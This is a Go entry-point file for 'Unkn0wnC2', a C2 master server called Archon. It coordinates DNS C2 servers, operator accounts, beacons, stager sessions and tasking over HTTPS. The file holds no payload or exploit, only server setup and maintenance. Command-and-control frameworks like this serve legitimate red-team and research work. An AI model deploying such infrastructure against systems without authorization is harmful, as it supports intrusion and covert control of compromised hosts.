// Package main implements the Unkn0wnC2 Master Server entry point.
// This server provides centralized command and control for distributed DNS C2 servers,
// offering a WebUI and HTTPS API for multi-operator team collaboration.
package main

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/gorilla/mux"
)

// Build-time version information (set via -ldflags during build)
var (
	version   = "0.3.0-shadow-mesh"
	buildDate = "unknown"
	gitCommit = "unknown"
)

func main() {
	// Parse command line flags
	debugFlag := flag.Bool("debug", false, "Enable debug mode")
	generateConfig := flag.Bool("generate-config", false, "Generate example configuration file")
	configPath := flag.String("config", "/opt/unkn0wnc2/master_config.json", "Path to configuration file")
	bindAddr := flag.String("bind-addr", "", "Override bind address (e.g., 0.0.0.0 or 192.168.1.100)")
	bindPort := flag.Int("bind-port", 0, "Override bind port (e.g., 8443)")
	flag.Parse()

	// Generate example config and exit if requested
	if *generateConfig {
		if err := GenerateExampleConfig(*configPath); err != nil {
			fmt.Fprintf(os.Stderr, "Failed to generate config: %v\n", err)
			os.Exit(1)
		}
		os.Exit(0)
	}

	// Display banner
	printBanner()

	// Load configuration
	cfg, err := LoadConfig(*configPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to load config: %v\n", err)
		os.Exit(1)
	}

	// Override with command line flags
	if *debugFlag {
		cfg.Debug = true
	}
	if *bindAddr != "" {
		cfg.BindAddr = *bindAddr
	}
	if *bindPort != 0 {
		cfg.BindPort = *bindPort
	}

	// Validate configuration
	if err := ValidateConfig(cfg); err != nil {
		fmt.Fprintf(os.Stderr, "Configuration validation failed: %v\n", err)
		os.Exit(1)
	}

	// Initialize logger - always log to file, also to stdout if debug mode
	logDir := "/opt/unkn0wnc2/logs"
	if err := InitLogger(logDir, cfg.Debug); err != nil {
		fmt.Fprintf(os.Stderr, "Failed to initialize logger: %v\n", err)
		os.Exit(1)
	}
	defer CloseLogger()

	LogInfo("Archon Master Server starting")
	LogInfo("Configuration loaded from: %s", *configPath)
	LogInfo("Bind address: %s:%d", cfg.BindAddr, cfg.BindPort)
	LogInfo("TLS Certificate: %s", cfg.TLSCert)
	LogInfo("Database: %s", cfg.DatabasePath)
	LogInfo("Debug mode: %v", cfg.Debug)
	LogInfo("Log directory: %s", logDir)

	// Initialize database
	LogInfo("Initializing database...")
	db, err := NewMasterDatabase(cfg.DatabasePath)
	if err != nil {
		LogError("Failed to initialize database: %v", err)
		os.Exit(1)
	}
	defer db.Close()

	// Check if initial admin setup is needed
	if err := initializeAdmin(db, cfg); err != nil {
		LogError("Failed to initialize admin: %v", err)
		os.Exit(1)
	}

	// Register pre-configured DNS servers
	if err := registerConfiguredDNSServers(db, cfg); err != nil {
		LogWarn("Failed to register DNS servers: %v", err)
		// Don't exit - this is not critical
	}

	// Create API server
	apiServer := NewAPIServer(db, cfg)

	// Setup router
	router := mux.NewRouter()

	// Apply logging middleware to all routes
	router.Use(apiServer.loggingMiddleware)

	// Setup API routes
	apiServer.SetupRoutes(router)

	// Create HTTPS server
	addr := fmt.Sprintf("%s:%d", cfg.BindAddr, cfg.BindPort)
	srv := &http.Server{
		Addr:         addr,
		Handler:      router,
		ReadTimeout:  30 * time.Second,  // Increased from 15s
		WriteTimeout: 60 * time.Second,  // Increased from 15s for large transfers
		IdleTimeout:  120 * time.Second, // Increased from 60s
	}

	// Start server in a goroutine
	go func() {
		LogInfo("=================================================")
		LogInfo("Archon Server v%s", version)
		LogInfo("Build: %s (commit: %s)", buildDate, gitCommit)
		LogInfo("=================================================")
		LogInfo("HTTPS Server listening on: https://%s", addr)
		LogInfo("TLS enabled with certificate: %s", cfg.TLSCert)
		LogInfo("Database: %s", cfg.DatabasePath)
		LogInfo("DNS Servers registered: %d", len(cfg.DNSServers))

		// Display registered DNS servers
		if len(cfg.DNSServers) > 0 {
			LogInfo("Registered DNS Servers:")
			for _, dns := range cfg.DNSServers {
				status := "enabled"
				if !dns.Enabled {
					status = "disabled"
				}
				LogInfo("  - %s: %s (%s) [%s]", dns.ID, dns.Domain, dns.Address, status)
			}
		}

		// Start HTTPS server
		if err := srv.ListenAndServeTLS(cfg.TLSCert, cfg.TLSKey); err != nil && err != http.ErrServerClosed {
			LogError("Failed to start HTTPS server: %v", err)
			os.Exit(1)
		}
	}()

	// Start periodic database cleanup (runs every 6 hours)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				LogError("PANIC in cleanup goroutine: %v", r)
			}
		}()

		ticker := time.NewTicker(6 * time.Hour)
		defer ticker.Stop()

		// Run initial cleanup after 1 hour
		time.Sleep(1 * time.Hour)

		for {
			LogDebug("Running database maintenance...")

			// Cleanup completed tasks older than 30 days
			if count, err := db.CleanupOldTasks(30); err == nil && count > 0 {
				LogInfo("Cleanup: Removed %d old completed tasks", count)
			} else if err != nil {
				LogWarn("Cleanup: Failed to cleanup old tasks: %v", err)
			}

			// Cleanup inactive beacons older than 60 days
			if count, err := db.CleanupInactiveBeacons(60); err == nil && count > 0 {
				LogInfo("Cleanup: Removed %d inactive beacons", count)
			} else if err != nil {
				LogWarn("Cleanup: Failed to cleanup inactive beacons: %v", err)
			}

			// Cleanup completed stager sessions older than 7 days
			if count, err := db.CleanupCompletedStagerSessions(7); err == nil && count > 0 {
				LogInfo("Cleanup: Removed %d old stager sessions", count)
			} else if err != nil {
				LogWarn("Cleanup: Failed to cleanup stager sessions: %v", err)
			}

			// Expire stale pending tasks (pending for 48+ hours)
			if count, err := db.CleanupStalePendingTasks(48); err == nil && count > 0 {
				LogInfo("Cleanup: Expired %d stale pending tasks (pending >48hrs)", count)
			} else if err != nil {
				LogWarn("Cleanup: Failed to cleanup stale pending tasks: %v", err)
			}

			// Detect partial results (sent tasks with incomplete chunks after 6 hours)
			if count, err := db.DetectPartialResults(6); err == nil && count > 0 {
				LogWarn("Cleanup: Detected %d tasks with partial results (incomplete >6hrs)", count)
			} else if err != nil {
				LogWarn("Cleanup: Failed to detect partial results: %v", err)
			}

			// Cleanup expired and revoked sessions
			if count, err := db.CleanupExpiredSessions(); err == nil && count > 0 {
				LogInfo("Cleanup: Removed %d expired/revoked sessions", count)
			} else if err != nil {
				LogWarn("Cleanup: Failed to cleanup sessions: %v", err)
			}

			// Wait for next tick
			<-ticker.C
		}
	}()

	// Wait for interrupt signal for graceful shutdown
	quit := make(chan os.Signal, 1)
	signal.Notify(quit, os.Interrupt, syscall.SIGTERM)
	<-quit

	LogInfo("Shutting down Archon Server...")

	// Create shutdown context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Shutdown HTTP server gracefully
	if err := srv.Shutdown(ctx); err != nil {
		LogError("Server shutdown error: %v", err)
	}

	// Close database connection
	if err := db.Close(); err != nil {
		LogError("Database close error: %v", err)
	}

	LogInfo("Archon Server stopped gracefully")
}

// initializeAdmin creates the initial admin account if it doesn't exist
func initializeAdmin(db *MasterDatabase, cfg Config) error {
	// Generate admin ID
	adminID := generateID()

	// Try to create admin account
	err := db.CreateOperator(
		adminID,
		cfg.AdminCredentials.Username,
		cfg.AdminCredentials.Password,
		"admin",
		"",
	)

	if err != nil {
		// If error is about duplicate username, admin already exists
		errStr := err.Error()
		if strings.Contains(errStr, "UNIQUE constraint") || strings.Contains(errStr, "constraint failed") {
			LogDebug("Admin account already exists")
			return nil
		}
		return fmt.Errorf("failed to create admin account: %w", err)
	}

	LogInfo("Created admin account: %s", cfg.AdminCredentials.Username)
	LogWarn("Default password is set - please change it after first login!")

	return nil
}

// registerConfiguredDNSServers registers DNS servers from configuration
func registerConfiguredDNSServers(db *MasterDatabase, cfg Config) error {
	for _, dnsConfig := range cfg.DNSServers {
		if !dnsConfig.Enabled {
			continue
		}

		err := db.RegisterDNSServer(
			dnsConfig.ID,
			dnsConfig.Domain,
			dnsConfig.Address,
			dnsConfig.APIKey,
		)

		if err != nil {
			LogWarn("Failed to register DNS server %s: %v", dnsConfig.ID, err)
			continue
		}

		LogDebug("Registered DNS server: %s (%s)", dnsConfig.ID, dnsConfig.Domain)
	}

	return nil
}

// generateID generates a random unique identifier
func generateID() string {
	bytes := make([]byte, 16)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

// printBanner displays the Master Server ASCII art banner
func printBanner() {
	fmt.Println(ColorRed)
	fmt.Println("  _    _       _           ___                    _____ ___  ")
	fmt.Println(" | |  | |     | |         / _ \\                  / ____|__ \\ ")
	fmt.Println(" | |  | |_ __ | | ___ __ | | | |_      ___ __   | |       ) |")
	fmt.Println(" | |  | | '_ \\| |/ / '_ \\| | | \\ \\ /\\ / / '_ \\  | |      / / ")
	fmt.Println(" | |__| | | | |   <| | | | |_| |\\ V  V /| | | | | |____ / /_ ")
	fmt.Println("  \\____/|_| |_|_|\\_\\_| |_|\\___/  \\_/\\_/ |_| |_|  \\_____|____|")
	fmt.Println(ColorReset)
	fmt.Println(ColorGreen + "                    ARCHON SERVER" + ColorReset)
	fmt.Println()
}

// ANSI color codes for terminal output
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[0;31m"
	ColorGreen  = "\033[0;32m"
	ColorYellow = "\033[0;33m"
	ColorBlue   = "\033[0;34m"
)
